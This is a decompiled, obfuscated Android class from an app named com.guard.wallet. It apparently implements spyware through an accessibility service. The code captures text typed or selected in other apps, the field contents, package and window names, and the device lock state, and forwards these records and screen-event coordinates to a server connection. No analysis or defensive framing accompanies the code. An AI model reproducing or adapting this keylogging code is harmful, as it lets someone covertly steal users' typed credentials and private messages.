package p012o;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.Point;
import com.guard.wallet.helper.AbstractC0178a;
import com.guard.wallet.msg.ReadEventMessage;
import com.guard.wallet.msg.ReadScreenEvent;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.AccessibilityEventStatVO;
import com.guard.wallet.stat.KeyboardEventVO;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import f0.C0289j;
import java.util.Objects;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/* loaded from: classes.dex */
public final /* synthetic */ class b0 implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f847a;

    /* renamed from: b */
    public final /* synthetic */ Object f848b;

    /* renamed from: c */
    public final /* synthetic */ Object f849c;

    public /* synthetic */ b0(Object obj, Object obj2, int i2) {
        this.f847a = i2;
        this.f849c = obj;
        this.f848b = obj2;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i2 = this.f847a;
        ReadScreenEvent readScreenEvent = null;
        r1 = null;
        String str = null;
        readScreenEvent = null;
        readScreenEvent = null;
        Object obj = this.f848b;
        Object obj2 = this.f849c;
        switch (i2) {
            case 0:
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) obj;
                AtomicBoolean atomicBoolean = ((c0) obj2).f856c;
                try {
                    atomicBoolean.set(true);
                    if (accessibilityEvent != null) {
                        try {
                            if (accessibilityEvent.getSource() != null) {
                                ReadScreenEvent readScreenEvent2 = new ReadScreenEvent(accessibilityEvent.getEventType());
                                AccessibilityNodeInfo source = accessibilityEvent.getSource();
                                Rect rect = new Rect();
                                source.getBoundsInScreen(rect);
                                AbstractC0178a.m341c(rect);
                                readScreenEvent2.getPoints().add(new Point(rect.exactCenterX(), rect.exactCenterY()));
                                readScreenEvent = readScreenEvent2;
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("o.c0", e2);
                        }
                    }
                    if (readScreenEvent != null) {
                        String m693N = AbstractC0252h.m693N(new ReadEventMessage(readScreenEvent));
                        if (Integer.valueOf(C0231c.m511G().f301z.size()).intValue() > 0) {
                            C0231c.m511G().m515I(m693N);
                        }
                        if (AbstractC0026q.m193z()) {
                            AbstractC0026q.m155F(m693N);
                        }
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("o.c0", e3);
                }
                atomicBoolean.set(false);
                break;
            case 1:
                MyAccessibilityService myAccessibilityService = (MyAccessibilityService) obj2;
                AccessibilityEvent accessibilityEvent2 = (AccessibilityEvent) obj;
                AtomicReference atomicReference = MyAccessibilityService.f320p;
                myAccessibilityService.getClass();
                if (accessibilityEvent2 != null) {
                    try {
                        if (accessibilityEvent2.getEventType() > 0) {
                            String charSequence = accessibilityEvent2.getPackageName() != null ? accessibilityEvent2.getPackageName().toString() : null;
                            String charSequence2 = accessibilityEvent2.getClassName() != null ? accessibilityEvent2.getClassName().toString() : null;
                            if ((!Objects.equals(charSequence, "com.android.systemui") || Objects.equals(16, Integer.valueOf(accessibilityEvent2.getEventType())) || Objects.equals(8192, Integer.valueOf(accessibilityEvent2.getEventType())) || myAccessibilityService.m530k(charSequence)) && MainApplication.getInstance() != null) {
                                MainApplication.getInstance().offerAccessibilityEvent(Integer.valueOf(accessibilityEvent2.getEventType()));
                                AccessibilityEventStatVO accessibilityEventStatVO = new AccessibilityEventStatVO();
                                accessibilityEventStatVO.setContainerCode("ACCESSIBILITY_CONTAINER");
                                accessibilityEventStatVO.setActivePackageName((String) MyAccessibilityService.f325u.get());
                                accessibilityEventStatVO.setActiveWindowClassName((String) MyAccessibilityService.f326v.get());
                                accessibilityEventStatVO.setEventPackageName(charSequence);
                                accessibilityEventStatVO.setEventClassName(charSequence2);
                                accessibilityEventStatVO.setEventValue(accessibilityEvent2.getEventType());
                                if (Objects.equals(16, Integer.valueOf(accessibilityEvent2.getEventType())) || Objects.equals(8192, Integer.valueOf(accessibilityEvent2.getEventType()))) {
                                    KeyboardEventVO keyboardEventVO = new KeyboardEventVO();
                                    keyboardEventVO.setBeforeText((accessibilityEvent2.getEventType() != 16 || accessibilityEvent2.getBeforeText() == null) ? null : accessibilityEvent2.getBeforeText().toString());
                                    if (accessibilityEvent2.getSource() != null && accessibilityEvent2.getSource().getText() != null) {
                                        str = accessibilityEvent2.getSource().getText().toString();
                                    }
                                    keyboardEventVO.setEditText(str);
                                    keyboardEventVO.setEventText(MyAccessibilityService.m547E(accessibilityEvent2));
                                    accessibilityEventStatVO.setKeyboardEvent(keyboardEventVO);
                                }
                                LockPatternVO B0 = AbstractC0251g.B0();
                                accessibilityEventStatVO.setIsDeviceLocked(B0.getIsDeviceLocked());
                                accessibilityEventStatVO.setIsDeviceSecure(B0.getIsDeviceSecure());
                                MessageRecordVO messageRecordVO = new MessageRecordVO();
                                messageRecordVO.setIntentCode("android.accessibility.service.USAGE_SUMMARY");
                                messageRecordVO.setExtraBody(accessibilityEventStatVO);
                                if (MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                                    MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
                                    break;
                                }
                            }
                        } else {
                            break;
                        }
                    } catch (Exception e4) {
                        AbstractC0026q.m186s("statAccessibilityEvent", e4);
                    }
                }
                break;
            default:
                C0289j c0289j = C0289j.f523f;
                ((Runnable) obj2).run();
                ((Semaphore) obj).release();
                break;
        }
    }
}
